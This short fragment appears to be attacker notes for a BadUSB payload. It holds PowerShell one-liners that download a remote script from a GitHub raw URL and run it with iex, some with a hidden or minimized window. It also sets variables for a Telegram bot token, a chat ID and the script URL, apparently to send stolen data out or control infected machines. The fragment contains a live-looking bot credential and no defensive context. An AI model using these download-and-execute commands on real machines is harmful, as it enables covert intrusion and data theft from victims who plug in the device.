...
BADUSB COMMANDS:
    ...
    iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/TYTTVN/ER/master/poc.ps1'))
    PowerShell.exe -WindowStyle Hidden -Command iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/TYTTVN/ER/master/poc.ps1'))
    PowerShell.exe -WindowStyle Minimized -Command iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/TYTTVN/ER/master/poc.ps1'))
REGEDIT:
...
$BotToken = "5682184115:AAFlllqS-EECixxZS7RlQap3t5wdYPG96aA"
$ChatID = '560028167'
$githubScript = 'https://raw.githubusercontent.com/TYTTVN/ER/master/poc.ps1'
